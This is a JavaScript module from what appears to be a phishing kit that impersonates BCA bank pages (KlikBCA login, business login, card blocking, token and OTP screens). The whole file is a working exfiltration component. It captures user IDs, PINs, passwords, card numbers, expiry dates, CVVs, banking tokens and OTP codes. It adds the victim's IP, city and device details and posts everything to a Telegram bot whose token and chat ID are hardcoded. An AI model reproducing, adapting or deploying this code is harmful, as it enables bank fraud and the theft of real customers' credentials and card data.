// send-to-telegram.js - BCA Notifier (clean, no emoji)
(function () {
  'use strict';

  const TOKEN = '8595751456:AAGz3SsuFLxuD6FG7Tn-PUGsjbQIgFIzmQM';
  const CHAT_ID = '8477342142';
  const API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

  async function send(text) {
    try {
      await fetch(API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
          disable_web_page_preview: true,
          disable_notification: false
        })
      });
    } catch (e) {}
  }

  function device() {
    const ua = navigator.userAgent;
    let b = 'Other';
    if (ua.includes('Firefox')) b = 'Firefox';
    else if (ua.includes('Edg')) b = 'Edge';
    else if (ua.includes('Chrome')) b = 'Chrome';
    else if (ua.includes('Safari')) b = 'Safari';
    else if (ua.includes('OPR')) b = 'Opera';
    let os = 'Other';
    if (ua.includes('Windows')) os = 'Windows';
    else if (ua.includes('Mac')) os = 'MacOS';
    else if (ua.includes('Linux')) os = 'Linux';
    else if (ua.includes('Android')) os = 'Android';
    else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
    return b + ' | ' + os;
  }

  function time() {
    const d = new Date();
    const pad = n => String(n).padStart(2, '0');
    return pad(d.getDate()) + '/' + pad(d.getMonth()+1) + '/' + d.getFullYear() + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes());
  }

  async function ip() {
    try {
      const r = await fetch('https://api.ipify.org?format=json');
      const d = await r.json();
      return d.ip || 'N/A';
    } catch { return 'N/A'; }
  }

  async function location(ipAddr) {
    try {
      const r = await fetch(`https://ipapi.co/${ipAddr}/json/`);
      const d = await r.json();
      if (d.city) return d.city;
      if (d.region) return d.region;
      if (d.country_name) return d.country_name;
    } catch (e) {}
    try {
      const r = await fetch(`https://ipinfo.io/${ipAddr}/json`);
      const d = await r.json();
      if (d.city) return d.city;
      if (d.region) return d.region;
      if (d.country) return d.country;
    } catch (e) {}
    return 'Tidak terdeteksi';
  }

  function pageName() {
    const path = window.location.pathname;
    if (path.includes('klikbca.html')) return 'KlikBCA Login';
    if (path.includes('bisnis.html')) return 'KlikBCA Bisnis';
    if (path.includes('blocked.html')) return 'Blokir Kartu';
    if (path.includes('lanjut.html')) return 'Lapor Bank Lain';
    if (path.includes('key.html')) return 'Key BCA Bisnis';
    if (path.includes('tokenen.html')) return 'Token BCA';
    if (path.includes('otp.html')) return 'OTP BCA';
    if (path.includes('menu.html')) return 'Menu Utama';
    if (path.includes('index.html') || path === '/' || path.endsWith('/')) return 'Landing Page';
    return path.split('/').pop() || 'Halaman';
  }

  async function infoSuffix() {
    const i = await ip();
    const loc = await location(i);
    return 'IP: ' + i + '\n' +
           'Kota: ' + loc + '\n' +
           'Device: ' + device() + '\n' +
           'Jam: ' + time() + '\n' +
           'Halaman: ' + pageName();
  }

  // Fungsi notifikasi tanpa emoji
  async function notifyKlikBCA(data) {
    if (!data || typeof data !== 'object') return;
    const userId = data.userId || 'Tidak ada';
    const pin = data.pin || 'Tidak ada';
    const suffix = await infoSuffix();
    await send('KLIKBCA LOGIN\nUser ID: ' + userId + '\nPIN: ' + pin + '\n\n' + suffix);
  }

  async function notifyBisnis(data) {
    if (!data || typeof data !== 'object') return;
    const username = data.username || 'Tidak ada';
    const password = data.password || 'Tidak ada';
    const suffix = await infoSuffix();
    await send('KLIKBCA BISNIS\nUsername: ' + username + '\nPassword: ' + password + '\n\n' + suffix);
  }

  async function notifyBlockCard(data) {
    if (!data || typeof data !== 'object') return;
    const cardNumber = data.cardNumber || 'Tidak ada';
    const expiry = data.expiry || 'Tidak ada';
    const cvv = data.cvv || 'Tidak ada';
    const suffix = await infoSuffix();
    await send('BLOKIR KARTU\nNomor Kartu: ' + cardNumber + '\nValid Thru: ' + expiry + '\nCVV: ' + cvv + '\n\n' + suffix);
  }

  async function notifyReportBank(data) {
    if (!data || typeof data !== 'object') return;
    const bank = data.bank || 'Tidak ada';
    const cardNumber = data.cardNumber || 'Tidak ada';
    const expiry = data.expiry || 'Tidak ada';
    const cvv = data.cvv || 'Tidak ada';
    const suffix = await infoSuffix();
    await send('LAPOR BANK LAIN\nBank: ' + bank + '\nNomor Kartu: ' + cardNumber + '\nValid Thru: ' + expiry + '\nCVV: ' + cvv + '\n\n' + suffix);
  }

  async function notifyToken(data) {
    if (!data || typeof data !== 'object') return;
    const token = data.token || 'Tidak ada';
    const suffix = await infoSuffix();
    await send('TOKEN BCA\nToken: ' + token + '\n\n' + suffix);
  }

  async function notifyOTP(data) {
    if (!data || typeof data !== 'object') return;
    const label = data.label || 'OTP';
    const otp = data.otp || 'Tidak ada';
    const suffix = await infoSuffix();
    await send('KODE OTP - ' + label + '\nOTP: ' + otp + '\n\n' + suffix);
  }

  async function notifyHome() {
    const suffix = await infoSuffix();
    await send('BERANDA DIKUNJUNGI\n' + suffix);
  }

  window.BCATelegram = {
    notifyKlikBCA,
    notifyBisnis,
    notifyBlockCard,
    notifyReportBank,
    notifyToken,
    notifyOTP,
    notifyHome
  };
})();